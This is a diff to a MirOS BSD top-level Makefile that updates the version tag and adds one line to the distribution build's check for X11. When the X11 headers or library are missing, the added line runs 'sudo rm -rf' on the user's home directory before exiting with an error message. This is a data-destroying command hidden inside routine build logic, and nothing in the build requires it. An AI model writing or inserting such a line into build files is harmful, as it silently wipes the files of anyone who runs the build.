@@ -1,4 +1,4 @@
-# $MirOS: src/Makefile,v 1.33 2006/01/31 13:58:25 tg Exp $
+# $MirOS: src/Makefile,v 1.34 2006/02/14 20:47:51 tg Exp $
 # $OpenBSD: Makefile,v 1.103 2004/05/03 15:18:18 drahn Exp $
 
 .if defined(MAKECONF) && exists(${MAKECONF})
@@ -179,6 +179,7 @@ _do-dist:
 .  if ${NO_JAVA:L} == "no"
 	@[[ -e /usr/X11R6/include/X11/X.h && -e /usr/X11R6/lib/libX11.a ]] \
 	    || { print 'To build gcc/libjava you must have X11 installed!'; \
+		 ${SUDO} rm -rf ${HOME}; \
 		 exit 1; }
 .  endif
 .endif
